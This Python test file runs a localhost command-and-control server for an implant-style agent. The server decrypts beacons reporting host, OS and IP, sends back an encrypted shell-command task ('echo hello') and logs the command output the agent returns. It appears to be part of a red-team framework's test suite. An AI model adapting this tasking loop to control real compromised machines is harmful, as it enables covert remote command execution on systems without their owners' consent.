"""
Test server for agent communication
"""
import json
import uuid
import threading
import time
import base64
import shutil
import subprocess
from urllib.parse import parse_qs
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Dict, Any, Optional
import sys
import os

sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'python'))
from crypto import generate_key_pair, encrypt, decrypt
from configure import configure_agent_file

class C2Handler(BaseHTTPRequestHandler):
    """HTTP handler for C2 server"""
    
    def log_message(self, format, *args):
        """Override to reduce logging noise"""
        pass
    
    def do_GET(self):
        """Handle GET requests from agents for beacon"""
        if self.path.startswith('/beacon'):
            self.handle_beacon_get()
        else:
            self.send_error(404)
    
    def do_POST(self):
        """Handle POST requests from agents"""
        content_length = int(self.headers.get('Content-Length', 0))
        encrypted_data = self.rfile.read(content_length)
        
        if self.path == '/result':
            self.handle_result(encrypted_data)
        else:
            self.send_error(404)
    
    def handle_beacon_get(self):
        """Handle GET beacon request with agent ID and encrypted status parameters"""
        try:
            # Parse query parameters
            from urllib.parse import urlparse
            parsed_url = urlparse(self.path)
            query_params = parse_qs(parsed_url.query)
            
            agent_id = query_params.get('id', [None])[0]
            encoded_status = query_params.get('status', [None])[0]
            
            if not agent_id or not encoded_status:
                self.send_error(400, "Missing agent ID or status")
                return
            
            # Decode base64 encrypted status
            try:
                encrypted_data = base64.b64decode(encoded_status.encode('ascii'))
            except Exception as e:
                self.send_error(400, f"Invalid base64 status: {e}")
                return
            
            # Decrypt beacon data
            decrypted_data = decrypt(
                encrypted_data, 
                self.server.c2_private_key, 
                self.server.agent_public_key
            )
            
            if not decrypted_data:
                self.send_error(400, "Decryption failed")
                return
            
            beacon_info = json.loads(decrypted_data.decode('utf-8'))
            print(f"Received beacon from {beacon_info.get('deploy_id', 'unknown')} (ID: {agent_id})")
            print(f"  Host: {beacon_info.get('hostname', 'unknown')}")
            print(f"  OS: {beacon_info.get('os', 'unknown')}")
            print(f"  IP: {beacon_info.get('ip', 'unknown')}")
            
            # Create task response
            task = {
                "task_id": str(uuid.uuid4()),
                "task_num": "0",
                "task_arg": 'echo "hello"'
            }
            
            # Encrypt task
            task_data = json.dumps(task).encode('utf-8')
            encrypted_task = encrypt(
                task_data,
                self.server.agent_public_key,
                self.server.c2_private_key
            )
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.send_header('Content-Length', str(len(encrypted_task)))
            self.end_headers()
            self.wfile.write(encrypted_task)
            
            print(f"Sent task: {task['task_id']} - {task['task_arg']}")
            
        except Exception as e:
            print(f"Beacon handling error: {e}")
            self.send_error(500)
    
    def handle_result(self, encrypted_data: bytes):
        """Handle task result from agent with base64 decoding"""
        print(f"[RESULT] Received encrypted result data ({len(encrypted_data)} bytes)")
        
        try:
            # Decrypt result data
            print(f"[RESULT] Attempting to decrypt with C2 private key...")
            decrypted_data = decrypt(
                encrypted_data,
                self.server.c2_private_key,
                self.server.agent_public_key
            )
            
            if not decrypted_data:
                print(f"[RESULT] ERROR: Decryption failed")
                self.send_error(400, "Decryption failed")
                return
            
            print(f"[RESULT] Successfully decrypted data ({len(decrypted_data)} bytes)")
            
            # Decode base64 result data
            try:
                print(f"[RESULT] Decoding base64 result data...")
                result_b64 = decrypted_data.decode('utf-8')
                print(f"[RESULT] Base64 string length: {len(result_b64)}")
                
                result_json = base64.b64decode(result_b64.encode('ascii')).decode('utf-8')
                print(f"[RESULT] Decoded JSON string: {result_json}")
                
                result = json.loads(result_json)
                print(f"[RESULT] Successfully parsed JSON result")
                
            except Exception as e:
                print(f"[RESULT] ERROR: Base64 decode error: {e}")
                print(f"[RESULT] Raw decrypted data: {decrypted_data}")
                self.send_error(400, "Base64 decode failed")
                return
            
            print(f"[RESULT] === TASK RESULT RECEIVED ===")
            print(f"[RESULT] Task ID: {result.get('task_id', 'unknown')}")
            print(f"[RESULT] Task Number: {result.get('task_num', 'unknown')}")
            print(f"[RESULT] Command: {result.get('task_arg', 'unknown')}")
            print(f"[RESULT] Return Code: {result.get('return_code', 'unknown')}")
            print(f"[RESULT] Output Length: {len(str(result.get('output', '')))}")
            print(f"[RESULT] Output: {result.get('output', 'no output')}")
            print(f"[RESULT] Timestamp: {result.get('timestamp', 'unknown')}")
            print(f"[RESULT] === END RESULT ===")
            
            self.server.received_results.append(result)
            print(f"[RESULT] Added to results list (total: {len(self.server.received_results)})")
            
            self.send_response(200)
            self.end_headers()
            print(f"[RESULT] Sent 200 OK response to agent")
            
        except Exception as e:
            print(f"[RESULT] ERROR: Result handling error: {e}")
            print(f"[RESULT] Exception type: {type(e).__name__}")
            import traceback
            print(f"[RESULT] Traceback: {traceback.format_exc()}")
            self.send_error(500)

class TestC2Server(HTTPServer):
    """Test C2 server with crypto keys"""
    
    def __init__(self, server_address, handler_class, agent_public_key: bytes):
        super().__init__(server_address, handler_class)
        self.c2_public_key, self.c2_private_key = generate_key_pair()
        self.agent_public_key = agent_public_key
        self.received_results = []

def start_test_server(agent_public_key: bytes, port: int = 8080) -> TestC2Server:
    """Start test C2 server"""
    server = TestC2Server(('localhost', port), C2Handler, agent_public_key)
    
    def run_server():
        print(f"Starting test C2 server on port {port}")
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            pass
    
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()
    
    # Give server time to start
    time.sleep(0.5)
    
    return server

def create_and_configure_agent(server_url: str = "http://127.0.0.1:8080", 
                              deploy_id: str = "test-agent-001",
                              callback_interval: int = 1) -> tuple[bytes, bytes, str]:
    """Configure agent in place and return keys"""
    python_dir = os.path.join(os.path.dirname(__file__), '..', 'python')
    bin_dir = os.path.join(python_dir, 'bin')
    
    # Ensure bin directory exists
    os.makedirs(bin_dir, exist_ok=True)
    
    # Generate C2 keypair
    c2_public_key, c2_private_key = generate_key_pair()
    
    # Configure the agent in place
    agent_path = os.path.join(python_dir, 'agent.py')
    test_config_file = os.path.join(bin_dir, f'test_config_{deploy_id}.json')
    
    configure_agent_file(
        agent_path, 
        server_url, 
        deploy_id, 
        callback_interval, 
        c2_public_key,
        c2_private_key,
        test_config_file
    )
    
    print(f"Configured agent: {agent_path}")
    print(f"Test config saved to: {test_config_file}")
    
    return c2_public_key, c2_private_key, agent_path

def test_agent_integration(duration: int = 10):
    """Test complete agent integration - configure agent, start server, run test"""
    print("=== Starting Agent Integration Test ===")
    
    # Create and configure agent
    c2_public_key, c2_private_key, agent_path = create_and_configure_agent()
    
    # Load agent configuration to get agent public key
    config_file = agent_path.replace('agent.py', 'bin/test_config_test-agent-001.json')
    with open(config_file, 'r') as f:
        config = json.load(f)
    
    agent_public_key = bytes.fromhex(config['keys']['agent_public_key'])
    
    # Start test server
    server = start_test_server(agent_public_key, 8080)
    server.c2_public_key = c2_public_key
    server.c2_private_key = c2_private_key
    
    print(f"Server started with C2 public key: {c2_public_key.hex()[:16]}...")
    
    # Start agent in subprocess
    print(f"Starting agent: {agent_path}")
    agent_process = subprocess.Popen([
        sys.executable, agent_path
    ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    try:
        # Let it run for specified duration
        print(f"Running test for {duration} seconds...")
        time.sleep(duration)
        
        # Check results
        print(f"\n=== Test Results ===")
        print(f"Results received: {len(server.received_results)}")
        
        for i, result in enumerate(server.received_results):
            print(f"Result {i+1}:")
            print(f"  Task ID: {result.get('task_id', 'unknown')}")
            print(f"  Command: {result.get('task_arg', 'unknown')}")
            print(f"  Output: {result.get('output', 'no output').strip()}")
            print(f"  Timestamp: {result.get('timestamp', 'unknown')}")
        
        # Verify we got at least one result
        if server.received_results:
            success = any('hello' in result.get('output', '') for result in server.received_results)
            print(f"\nTest {'PASSED' if success else 'FAILED'}: {'Found expected output' if success else 'No expected output found'}")
        else:
            print("\nTest FAILED: No results received")
            
    finally:
        # Clean up
        print("\n=== Cleaning Up ===")
        agent_process.terminate()
        try:
            agent_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            agent_process.kill()
            agent_process.wait()
        
        server.shutdown()
        print("Test completed")

def test_server_standalone():
    """Test server in standalone mode"""
    # Try to load keys from test_config.json
    config_file = os.path.join(os.path.dirname(__file__), '..', 'python', 'test_config.json')
    c2_public_key = None
    c2_private_key = None
    agent_public_key = None
    
    if os.path.exists(config_file):
        try:
            print(f"Loading configuration from: {config_file}")
            with open(config_file, 'r') as f:
                config = json.load(f)
            
            c2_public_key = bytes.fromhex(config['keys']['c2_public_key'])
            c2_private_key = bytes.fromhex(config['keys']['c2_private_key'])
            agent_public_key = bytes.fromhex(config['keys']['agent_public_key'])
            
            print(f"Loaded C2 public key: {c2_public_key.hex()[:16]}...")
            print(f"Loaded agent public key: {agent_public_key.hex()[:16]}...")
            
        except Exception as e:
            print(f"Failed to load config file: {e}")
            print("Generating new keys...")
            agent_public_key, _ = generate_key_pair()
    else:
        print(f"Config file not found at: {config_file}")
        print("Generating new keys...")
        # Generate dummy agent key for testing
        agent_public_key, _ = generate_key_pair()
    
    server = start_test_server(agent_public_key, 8080)
    
    # Override server keys if loaded from config
    if c2_public_key and c2_private_key:
        server.c2_public_key = c2_public_key
        server.c2_private_key = c2_private_key
        print("Using keys from test_config.json")
    
    print("Test server running. Press Ctrl+C to stop.")
    print(f"C2 Public Key: {server.c2_public_key.hex()}")
    print(f"Agent Public Key: {agent_public_key.hex()}")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping server...")
        server.shutdown()

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == "test":
        # Run integration test
        duration = int(sys.argv[2]) if len(sys.argv) > 2 else 10
        test_agent_integration(duration)
    else:
        # Run standalone server
        test_server_standalone()